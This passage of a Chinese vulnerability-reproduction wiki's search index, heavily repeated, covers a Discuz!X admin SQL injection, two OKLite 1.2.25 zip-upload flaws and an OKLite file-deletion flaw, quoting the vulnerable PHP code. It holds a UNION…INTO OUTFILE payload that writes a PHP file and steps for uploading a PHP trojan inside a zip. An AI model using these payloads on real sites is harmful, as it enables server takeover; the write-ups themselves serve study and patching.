\u540e\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Discuz%21X/Discuz%21X%20%E5%B0%8F%E4%BA%8E3.4%20R20191201%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u4e0d\u4e45\u4ee5\u524dDiscuz!X\u7684\u540e\u53f0\u62ab\u9732\u4e86\u4e00\u4e2asql\u6ce8\u5165\u7684\u6f0f\u6d1e\uff0c\u8fd9\u91cc\u4e5f\u8981\u611f\u8c22\u6f0f\u6d1e\u7684\u53d1\u73b0\u548c\u7814\u7a76\u8005\uff08\u65e0\u7cd6\u7684kn1f3)\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Discuz%21X/Discuz%21X%20%E5%B0%8F%E4%BA%8E3.4%20R20191201%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] Discuz!X <3.4 R20191201 \u7248\u672c","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Discuz%21X/Discuz%21X%20%E5%B0%8F%E4%BA%8E3.4%20R20191201%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u73af\u5883\u642d\u5efa","text":"\u767e\u5ea6\u4e91\u76d8\u4e0b\u8f7d\u94fe\u63a5 \u5bc6\u7801: 0515 \u5c06 **upload**\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u62f7\u5165**phpstudy**\u4e0b\u7684WWW\u76ee\u5f55\u6253\u5f00\u7f51\u7ad9\u6309\u7167\u6b65\u9aa4\u5b89\u88c5\u5c31\u884c\u4e86","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Discuz%21X/Discuz%21X%20%E5%B0%8F%E4%BA%8E3.4%20R20191201%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6765\u5230\u540e\u53f0\u9875\u9762, \u5728 UCenter \u5e94\u7528 ID \u4f4d\u7f6e\u7684\u53c2\u6570\u6dfb\u52a0\u5355\u5f15\u53f7\u5e76\u6293\u5305 \u53d1\u73b0\u51fa\u73b0SQL\u8bed\u53e5\u62a5\u9519 \u4f7f\u7528\u62a5\u9519\u6ce8\u5165\u53bb\u83b7\u53d6\u7248\u672c\u53f7 \u8fd9\u91cc\u7684\u53c2\u6570\u4e3a settingnew[uc][appid] \u67e5\u770b\u6587\u4ef6 \\source\\admincp\\admincp_setting.php \uff0c \u57282677\u884c\u627e\u5230\u4e86\u8f93\u5165\u70b9 \u6839\u636e\u62a5\u9519\u8bed\u53e5\u627e\u5230SQL\u8bed\u53e5\u6267\u884c\u70b9\uff0c\u5728\u6587\u4ef6**uc_client\\model\\base.php** \u4e2d\u7684 206\u884c \u901a\u8fc7\u8fd9\u91cc\u7684\u8bed\u53e5\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 union\u6ce8\u5165 \u7684\u65b9\u6cd5\u6765\u5199\u5165\u6076\u610f\u6587\u4ef6( secure_file_priv\u4e0d\u80fd\u4e3aNull ) 1' union select \"<?php phpinfo();?>\" into outfile 'D:/peiqi.php';--+ \u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u7684\u65b9\u6cd5","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/OKLite/OKLite%201.2.25%20%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","text":"OKLite 1.2.25 \u540e\u53f0\u63d2\u4ef6\u5b89\u88c5 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 OKLite v1.2.25 \u540e\u53f0\u63d2\u4ef6\u8fc7\u6ee4\u4e0d\u5b8c\u5584\u5bfc\u81f4\u53ef\u4ee5\u4e0a\u4f20\u6076\u610f\u6728\u9a6c\u6587\u4ef6 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] OKLite 1.2.25 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5173\u4e8e\u6267\u884c\u903b\u8f91\u53c2\u7167\u4e0a\u4e00\u7bc7 OKLite 1.2.25 \u540e\u53f0\u6a21\u5757\u5bfc\u5165 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 CVE-2019-16131 \u51fa\u73b0\u6f0f\u6d1e\u7684\u4f4d\u7f6e\u5728\u4e8e**framework/admin/plugin_control.php** public function unzip_f() { $id = $this->get('id','int'); $rs = $this->model('res')->get_one($id); if(!$rs){ $this->json(P_Lang('\u9644\u4ef6\u4e0d\u5b58\u5728')); } if($rs['ext'] != 'zip'){ $this->json(P_Lang('\u975eZIP\u6587\u4ef6\u4e0d\u652f\u6301\u5728\u7ebf\u89e3\u538b')); } if(!file_exists($this->dir_root.$rs['filename'])){ $this->json(P_Lang('\u6587\u4ef6\u4e0d\u5b58\u5728')); } $info = $this->lib('phpzip')->zip_info($this->dir_root.$rs['filename']); $info = current($info); if(!$info['filename']){ $this->json(P_Lang('\u63d2\u4ef6\u6709\u5f02\u5e38')); } $info = explode('/',$info['filename']); if(!$info[0]){ $this->json(P_Lang('\u63d2\u4ef6\u6709\u5f02\u5e38')); } if(file_exists($this->dir_root.'plugins/'.$info[0])){ $this->json(P_Lang('\u63d2\u4ef6\u5df2\u5b58\u5728\uff0c\u4e0d\u5141\u8bb8\u91cd\u590d\u89e3\u538b')); } if(!$info[1]){ $this->json(P_Lang('\u63d2\u4ef6\u6253\u5305\u6a21\u5f0f\u6709\u95ee\u9898')); } $this->lib('phpzip')->unzip($this->dir_root.$rs['filename'],$this->dir_root.'plugins/'); $this->json(true); } \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u9700\u8981\u4e0a\u4f20ZIP\u538b\u7f29\u5305\u683c\u5f0f\u7684\u63d2\u4ef6\uff0c\u8ddf\u8fdb**zip_info**\u51fd\u6570 \u51fd\u6570\u4f4d\u7f6e framework/libs/phpzip.php \u8fd9\u91cc\u4f1a\u8fd4\u56de\u5173\u4e8eZIP\u538b\u7f29\u5305\u7684\u4e00\u4e9b\u4fe1\u606f \u5f80\u4e0b\u770b\u5173\u952e\u4f4d\u7f6e $info = explode('/',$info['filename']); if(!$info[0]){ $this->json(P_Lang('\u63d2\u4ef6\u6709\u5f02\u5e38')); } if(file_exists($this->dir_root.'plugins/'.$info[0])){ $this->json(P_Lang('\u63d2\u4ef6\u5df2\u5b58\u5728\uff0c\u4e0d\u5141\u8bb8\u91cd\u590d\u89e3\u538b')); } if(!$info[1]){ $this->json(P_Lang('\u63d2\u4ef6\u6253\u5305\u6a21\u5f0f\u6709\u95ee\u9898')); } $this->lib('phpzip')->unzip($this->dir_root.$rs['filename'],$this->dir_root.'plugins/'); $this->json(true); \u8fd9\u91cc\u7528 explode\u51fd\u6570\u4ee5 / \u5206\u9694\u8fd4\u56de\u4e24\u4e2a\u503c\uff0c\u4e5f\u5c31\u662f\u8bf4\u683c\u5f0f\u5e94\u4e3a AAA/BBB**\u8fd9\u6837\u7684\u76ee\u5f55\u683c\u5f0f\uff0c\u76f4\u63a5\u4e0a\u4f20ZIP\u6587\u4ef6\u5219\u4f1a\u62a5\u9519 **\u63d2\u4ef6\u6253\u5305\u6a21\u5f0f\u6709\u95ee\u9898 \u5728\u8fd9\u91cc\u4e0a\u4f20\u4e00\u4e2aZIP\u6587\u4ef6\uff0c\u683c\u5f0f\u8981\u662f\u89e3\u538b\u51fa\u6765\u4e3a\u76ee\u5f55\uff0c\u76ee\u5f55\u4e2d\u542bPHP\u6587\u4ef6\u5c31\u884c\u4e86 $this->lib('phpzip')->unzip($this->dir_root.$rs['filename'],$this->dir_root.'plugins/'); $this->json(true); \u6700\u540e\u4e24\u884c\u544a\u8bc9\u4e86\u6587\u4ef6\u89e3\u538b\u7684\u4f4d\u7f6e\uff0c\u4e0a\u4f20\u7684\u6587\u4ef6\u5728 plugins\u76ee\u5f55\u4e0b","title":"OKLite 1.2.25 \u540e\u53f0\u63d2\u4ef6\u5b89\u88c5 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/OKLite/OKLite%201.2.25%20%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#oklite-1225-\u540e\u53f0\u63d2\u4ef6\u5b89\u88c5-\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20","text":"","title":"OKLite 1.2.25 \u540e\u53f0\u63d2\u4ef6\u5b89\u88c5 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/OKLite/OKLite%201.2.25%20%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u6f0f\u6d1e\u63cf\u8ff0","text":"OKLite v1.2.25 \u540e\u53f0\u63d2\u4ef6\u8fc7\u6ee4\u4e0d\u5b8c\u5584\u5bfc\u81f4\u53ef\u4ee5\u4e0a\u4f20\u6076\u610f\u6728\u9a6c\u6587\u4ef6","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/OKLite/OKLite%201.2.25%20%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] OKLite 1.2.25","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/OKLite/OKLite%201.2.25%20%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u6f0f\u6d1e\u590d\u73b0","text":"\u5173\u4e8e\u6267\u884c\u903b\u8f91\u53c2\u7167\u4e0a\u4e00\u7bc7 OKLite 1.2.25 \u540e\u53f0\u6a21\u5757\u5bfc\u5165 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 CVE-2019-16131 \u51fa\u73b0\u6f0f\u6d1e\u7684\u4f4d\u7f6e\u5728\u4e8e**framework/admin/plugin_control.php** public function unzip_f() { $id = $this->get('id','int'); $rs = $this->model('res')->get_one($id); if(!$rs){ $this->json(P_Lang('\u9644\u4ef6\u4e0d\u5b58\u5728')); } if($rs['ext'] != 'zip'){ $this->json(P_Lang('\u975eZIP\u6587\u4ef6\u4e0d\u652f\u6301\u5728\u7ebf\u89e3\u538b')); } if(!file_exists($this->dir_root.$rs['filename'])){ $this->json(P_Lang('\u6587\u4ef6\u4e0d\u5b58\u5728')); } $info = $this->lib('phpzip')->zip_info($this->dir_root.$rs['filename']); $info = current($info); if(!$info['filename']){ $this->json(P_Lang('\u63d2\u4ef6\u6709\u5f02\u5e38')); } $info = explode('/',$info['filename']); if(!$info[0]){ $this->json(P_Lang('\u63d2\u4ef6\u6709\u5f02\u5e38')); } if(file_exists($this->dir_root.'plugins/'.$info[0])){ $this->json(P_Lang('\u63d2\u4ef6\u5df2\u5b58\u5728\uff0c\u4e0d\u5141\u8bb8\u91cd\u590d\u89e3\u538b')); } if(!$info[1]){ $this->json(P_Lang('\u63d2\u4ef6\u6253\u5305\u6a21\u5f0f\u6709\u95ee\u9898')); } $this->lib('phpzip')->unzip($this->dir_root.$rs['filename'],$this->dir_root.'plugins/'); $this->json(true); } \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u9700\u8981\u4e0a\u4f20ZIP\u538b\u7f29\u5305\u683c\u5f0f\u7684\u63d2\u4ef6\uff0c\u8ddf\u8fdb**zip_info**\u51fd\u6570 \u51fd\u6570\u4f4d\u7f6e framework/libs/phpzip.php \u8fd9\u91cc\u4f1a\u8fd4\u56de\u5173\u4e8eZIP\u538b\u7f29\u5305\u7684\u4e00\u4e9b\u4fe1\u606f \u5f80\u4e0b\u770b\u5173\u952e\u4f4d\u7f6e $info = explode('/',$info['filename']); if(!$info[0]){ $this->json(P_Lang('\u63d2\u4ef6\u6709\u5f02\u5e38')); } if(file_exists($this->dir_root.'plugins/'.$info[0])){ $this->json(P_Lang('\u63d2\u4ef6\u5df2\u5b58\u5728\uff0c\u4e0d\u5141\u8bb8\u91cd\u590d\u89e3\u538b')); } if(!$info[1]){ $this->json(P_Lang('\u63d2\u4ef6\u6253\u5305\u6a21\u5f0f\u6709\u95ee\u9898')); } $this->lib('phpzip')->unzip($this->dir_root.$rs['filename'],$this->dir_root.'plugins/'); $this->json(true); \u8fd9\u91cc\u7528 explode\u51fd\u6570\u4ee5 / \u5206\u9694\u8fd4\u56de\u4e24\u4e2a\u503c\uff0c\u4e5f\u5c31\u662f\u8bf4\u683c\u5f0f\u5e94\u4e3a AAA/BBB**\u8fd9\u6837\u7684\u76ee\u5f55\u683c\u5f0f\uff0c\u76f4\u63a5\u4e0a\u4f20ZIP\u6587\u4ef6\u5219\u4f1a\u62a5\u9519 **\u63d2\u4ef6\u6253\u5305\u6a21\u5f0f\u6709\u95ee\u9898 \u5728\u8fd9\u91cc\u4e0a\u4f20\u4e00\u4e2aZIP\u6587\u4ef6\uff0c\u683c\u5f0f\u8981\u662f\u89e3\u538b\u51fa\u6765\u4e3a\u76ee\u5f55\uff0c\u76ee\u5f55\u4e2d\u542bPHP\u6587\u4ef6\u5c31\u884c\u4e86 $this->lib('phpzip')->unzip($this->dir_root.$rs['filename'],$this->dir_root.'plugins/'); $this->json(true); \u6700\u540e\u4e24\u884c\u544a\u8bc9\u4e86\u6587\u4ef6\u89e3\u538b\u7684\u4f4d\u7f6e\uff0c\u4e0a\u4f20\u7684\u6587\u4ef6\u5728 plugins\u76ee\u5f55\u4e0b","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/OKLite/OKLite%201.2.25%20%E5%90%8E%E5%8F%B0%E6%A8%A1%E5%9D%97%E5%AF%BC%E5%85%A5%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20CVE-2019-16131/","text":"OKLite 1.2.25 \u540e\u53f0\u6a21\u5757\u5bfc\u5165 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 CVE-2019-16131 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 OKLite v1.2.25 \u540e\u53f0\u6a21\u5757\u5bfc\u5165\u8fc7\u6ee4\u4e0d\u5b8c\u5584\u5bfc\u81f4\u53ef\u4ee5\u4e0a\u4f20\u6076\u610f\u6728\u9a6c\u6587\u4ef6 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] OKLite 1.2.25 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u9996\u5148\u8981\u5148\u6e05\u695a\u5b83\u7684\u6267\u884c\u6d41\u7a0b \u67e5\u770b\u6587\u4ef6 framework/init.php \u5728\u5f80\u4e0b\u9762\u770b\u53ef\u4ee5\u770b\u5230\u6267\u884c\u51fd\u6570\u7684\u903b\u8f91 \u4f8b\u5982 http://127.0.0.1/admin.php?c=ABC&f=EFG \u5219\u662f\u8c03\u7528 **framework\\admin\\ABC_control.php**\u4e2d\u7684**EFG_f**\u65b9\u6cd5 \u770b\u5230\u5728\u540e\u53f0\u6709\u4e00\u4e2a ZIP \u6587\u4ef6\u4e0a\u4f20\u7684\u51fd\u6570\uff0c\u627e\u4e00\u4e0b\u4e0a\u4f20ZIP\u6587\u4ef6\u7684\u4f4d\u7f6e \u6a21\u5757\u7ba1\u7406 \u2192 \u6a21\u5757\u5bfc\u5165 \u56de\u5934\u770b\u4e0b\u51fd\u6570\u65b9\u6cd5\u7684\u8c03\u7528 public function zipfile($input,$folder='') { if(!$input){ return array('status'=>'error','content'=>P_Lang('\u672a\u6307\u5b9a\u8868\u5355\u540d\u79f0')); } //\u5982\u679c\u672a\u6307\u5b9a\u5b58\u50a8\u6587\u4ef6\u5939\uff0c\u5219\u4f7f\u7528 if(!$folder){ $folder = 'data/cache/'; } $this->cateid = 0; $this->set_dir($folder); $this->set_type('zip'); $this->cate = array('id'=>0,'filemax'=>104857600,'root'=>$folder,'folder'=>'/','filetypes'=>'zip'); if(isset($_FILES[$input])){ $rs = $this->_upload($input); }else{ $rs = $this->_save($input); } if($rs['status'] != 'ok'){ return $rs; } $rs['cate'] = $this->cate; return $rs; } \u8fd9\u91cc\u7684 \u4e0a\u4f20\u76ee\u5f55\u9ed8\u8ba4\u4e3a data/cache \u8fd9\u4e2a\u76ee\u5f55\uff0c\u5e76\u8c03\u7528\u4e86\u4e24\u4e2a\u65b9\u6cd5 _upload \u548c _save \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u5176\u5b9e\u5bf9\u4e0a\u4f20\u7684zip\u5e76\u6ca1\u6709\u5bf9\u91cc\u9762\u7684\u6587\u4ef6\u6709\u4ec0\u4e48\u8fc7\u6ee4,\u4efb\u610f\u4e0a\u4f20\u4e00\u4e2aZIP\u6587\u4ef6\u6293\u5305 test.php**\u6587\u4ef6\u5185\u5bb9 \u5982\u4e0b\uff0c\u6253\u5305\u4e3a **test.zip \u4e0a\u4f20 <?php phpinfo();?> \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u8c03\u7528\u7684\u65b9\u6cd5\u662f upload_control\u4e2d\u7684 zip \u65b9\u6cd5 \u8fd9\u91cc\u653e\u5305\u540e\u53d1\u73b0\u8c03\u7528\u4e86\u53e6\u4e00\u4e2a\u65b9\u6cd5\uff0c\u8ddf\u8e2a\u4e0b\u4ee3\u7801 framework/admin/module_control.php \u4e2d\u7684 import_f\u65b9\u6cd5 \u8fd9\u91cc\u7684\u65b9\u6cd5\u4e3a\u89e3\u538b\u65b9\u6cd5\uff0c\u8bf4\u660eZIP\u6587\u4ef6\u4e0a\u4f20\u7684\u903b\u8f91\u4e3a **\u6a21\u5757\u4e0a\u4f20 \u2192 ZIP\u6587\u4ef6\u5199\u5165 data/cache \u2192 \u89e3\u538b\u521a\u521a\u7684ZIP\u6587\u4ef6\u5230 data/cache \u76ee\u5f55 ** \u6240\u4ee5\u8fd9\u91cc\u7684\u6d41\u7a0b\u5b8c\u5168\u662f\u6ca1\u6709\u8fc7\u6ee4\u5371\u9669\u6587\u4ef6\u7684\uff0c\u5c06\u4e00\u4e2a\u6728\u9a6c\u6587\u4ef6\u6253\u5305\u4e3aZIP\u6587\u4ef6\u4e0a\u4f20\u8bbf\u95ee\u5373\u53ef","title":"OKLite 1.2.25 \u540e\u53f0\u6a21\u5757\u5bfc\u5165 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 CVE-2019-16131"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/OKLite/OKLite%201.2.25%20%E5%90%8E%E5%8F%B0%E6%A8%A1%E5%9D%97%E5%AF%BC%E5%85%A5%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20CVE-2019-16131/#oklite-1225-\u540e\u53f0\u6a21\u5757\u5bfc\u5165-\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20-cve-2019-16131","text":"","title":"OKLite 1.2.25 \u540e\u53f0\u6a21\u5757\u5bfc\u5165 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 CVE-2019-16131"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/OKLite/OKLite%201.2.25%20%E5%90%8E%E5%8F%B0%E6%A8%A1%E5%9D%97%E5%AF%BC%E5%85%A5%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20CVE-2019-16131/#\u6f0f\u6d1e\u63cf\u8ff0","text":"OKLite v1.2.25 \u540e\u53f0\u6a21\u5757\u5bfc\u5165\u8fc7\u6ee4\u4e0d\u5b8c\u5584\u5bfc\u81f4\u53ef\u4ee5\u4e0a\u4f20\u6076\u610f\u6728\u9a6c\u6587\u4ef6","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/OKLite/OKLite%201.2.25%20%E5%90%8E%E5%8F%B0%E6%A8%A1%E5%9D%97%E5%AF%BC%E5%85%A5%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20CVE-2019-16131/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] OKLite 1.2.25","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/OKLite/OKLite%201.2.25%20%E5%90%8E%E5%8F%B0%E6%A8%A1%E5%9D%97%E5%AF%BC%E5%85%A5%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20CVE-2019-16131/#\u6f0f\u6d1e\u590d\u73b0","text":"\u9996\u5148\u8981\u5148\u6e05\u695a\u5b83\u7684\u6267\u884c\u6d41\u7a0b \u67e5\u770b\u6587\u4ef6 framework/init.php \u5728\u5f80\u4e0b\u9762\u770b\u53ef\u4ee5\u770b\u5230\u6267\u884c\u51fd\u6570\u7684\u903b\u8f91 \u4f8b\u5982 http://127.0.0.1/admin.php?c=ABC&f=EFG \u5219\u662f\u8c03\u7528 **framework\\admin\\ABC_control.php**\u4e2d\u7684**EFG_f**\u65b9\u6cd5 \u770b\u5230\u5728\u540e\u53f0\u6709\u4e00\u4e2a ZIP \u6587\u4ef6\u4e0a\u4f20\u7684\u51fd\u6570\uff0c\u627e\u4e00\u4e0b\u4e0a\u4f20ZIP\u6587\u4ef6\u7684\u4f4d\u7f6e \u6a21\u5757\u7ba1\u7406 \u2192 \u6a21\u5757\u5bfc\u5165 \u56de\u5934\u770b\u4e0b\u51fd\u6570\u65b9\u6cd5\u7684\u8c03\u7528 public function zipfile($input,$folder='') { if(!$input){ return array('status'=>'error','content'=>P_Lang('\u672a\u6307\u5b9a\u8868\u5355\u540d\u79f0')); } //\u5982\u679c\u672a\u6307\u5b9a\u5b58\u50a8\u6587\u4ef6\u5939\uff0c\u5219\u4f7f\u7528 if(!$folder){ $folder = 'data/cache/'; } $this->cateid = 0; $this->set_dir($folder); $this->set_type('zip'); $this->cate = array('id'=>0,'filemax'=>104857600,'root'=>$folder,'folder'=>'/','filetypes'=>'zip'); if(isset($_FILES[$input])){ $rs = $this->_upload($input); }else{ $rs = $this->_save($input); } if($rs['status'] != 'ok'){ return $rs; } $rs['cate'] = $this->cate; return $rs; } \u8fd9\u91cc\u7684 \u4e0a\u4f20\u76ee\u5f55\u9ed8\u8ba4\u4e3a data/cache \u8fd9\u4e2a\u76ee\u5f55\uff0c\u5e76\u8c03\u7528\u4e86\u4e24\u4e2a\u65b9\u6cd5 _upload \u548c _save \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u5176\u5b9e\u5bf9\u4e0a\u4f20\u7684zip\u5e76\u6ca1\u6709\u5bf9\u91cc\u9762\u7684\u6587\u4ef6\u6709\u4ec0\u4e48\u8fc7\u6ee4,\u4efb\u610f\u4e0a\u4f20\u4e00\u4e2aZIP\u6587\u4ef6\u6293\u5305 test.php**\u6587\u4ef6\u5185\u5bb9 \u5982\u4e0b\uff0c\u6253\u5305\u4e3a **test.zip \u4e0a\u4f20 <?php phpinfo();?> \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u8c03\u7528\u7684\u65b9\u6cd5\u662f upload_control\u4e2d\u7684 zip \u65b9\u6cd5 \u8fd9\u91cc\u653e\u5305\u540e\u53d1\u73b0\u8c03\u7528\u4e86\u53e6\u4e00\u4e2a\u65b9\u6cd5\uff0c\u8ddf\u8e2a\u4e0b\u4ee3\u7801 framework/admin/module_control.php \u4e2d\u7684 import_f\u65b9\u6cd5 \u8fd9\u91cc\u7684\u65b9\u6cd5\u4e3a\u89e3\u538b\u65b9\u6cd5\uff0c\u8bf4\u660eZIP\u6587\u4ef6\u4e0a\u4f20\u7684\u903b\u8f91\u4e3a **\u6a21\u5757\u4e0a\u4f20 \u2192 ZIP\u6587\u4ef6\u5199\u5165 data/cache \u2192 \u89e3\u538b\u521a\u521a\u7684ZIP\u6587\u4ef6\u5230 data/cache \u76ee\u5f55 ** \u6240\u4ee5\u8fd9\u91cc\u7684\u6d41\u7a0b\u5b8c\u5168\u662f\u6ca1\u6709\u8fc7\u6ee4\u5371\u9669\u6587\u4ef6\u7684\uff0c\u5c06\u4e00\u4e2a\u6728\u9a6c\u6587\u4ef6\u6253\u5305\u4e3aZIP\u6587\u4ef6\u4e0a\u4f20\u8bbf\u95ee\u5373\u53ef","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/OKLite/OKLite%201.2.25%20%E5%90%8E%E5%8F%B0%E9%A3%8E%E6%A0%BC%E6%A8%A1%E5%9D%97%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%20CVE-2019-16132/","text":"OKLite 1.2.25 \u540e\u53f0\u98ce\u683c\u6a21\u5757 \u4efb\u610f\u6587\u4ef6\u5220\u9664 CVE-2019-16132 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 OKLite 1.2.25 \u540e\u53f0\u98ce\u683c\u6a21\u5757\u5b58\u5728 \u5bf9\u5371\u9669\u5b57\u7b26\u672a\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u53ef\u4ee5\u5220\u9664\u4efb\u610f\u76ee\u5f55\u548c\u6587\u4ef6 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] OKLite 1.2.25 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u51fa\u73b0\u6f0f\u6d1e\u7684\u51fd\u6570\u5728\u6587\u4ef6 framework/admin/tpl_control.php \u4e2d\u7684 delfile_f() \u51fd\u6570 \u8fd9\u91cc\u5220\u9664\u6587\u4ef6\u4e3b\u8981\u8c03\u7528\u4e86 rm\u51fd\u6570 , \u4f4d\u7f6e\u5728 framework/libs/file.php /** * \u5220\u9664\u64cd\u4f5c\uff0c\u8bf7\u4e00\u5b9a\u8981\u5c0f\u5fc3\uff0c\u5728\u7a0b\u5e8f\u4e2d\u6700\u597d\u4e25\u683c\u4e00\u4e9b\uff0c\u4e0d\u7136\u6709\u53ef\u80fd\u5c06\u6574\u4e2a\u76ee\u5f55\u5220\u6389 * @\u53c2\u6570 $del \u8981\u5220\u9664\u7684\u6587\u4ef6\u6216\u6587\u4ef6\u5939 * @\u53c2\u6570 $type \u4ec5\u652f\u6301file\u548cfolder\uff0c\u4e3afile\u65f6\u4ec5\u5220\u9664$del\u6587\u4ef6\uff0c\u5982\u679c$del\u4e3a\u6587\u4ef6\u5939\uff0c\u8868\u793a\u5220\u9664\u5176\u4e0b\u9762\u7684\u6587\u4ef6\u3002\u4e3afolder\u65f6\uff0c\u8868\u793a\u5220\u9664$del\u8fd9\u4e2a\u6587\u4ef6\uff0c\u5982\u679c\u4e3a\u6587\u4ef6\u5939\uff0c\u8868\u793a\u5220\u9664\u6b64\u6587\u4ef6\u5939\u53ca\u5b50\u9879 * @\u8fd4\u56de true/false **/ public function rm($del,$type=\"file\") { if(!file_exists($del)){ return false; } if(is_file($del)){ unlink($del); return true; } $array = $this->_dir_list($del); if(!$array){ if($type == 'folder'){ rmdir($del); } return true; } foreach($array as $key=>$value){ if(file_exists($value)){ if(is_dir($value)){ $this->rm($value,$type); }else{ unlink($value); } } } if($type == \"folder\"){ rmdir($del); } return true; } \u8fd9\u91cc\u5bf9\u4f20\u5165\u7684\u53c2\u6570\u904d\u5386\uff0c\u83b7\u5f97\u7684\u6587\u4ef6\u540d\u6216\u6587\u4ef6\u5939\u8fdb\u884c\u5220\u9664 \u56de\u8fc7\u5934\u770b 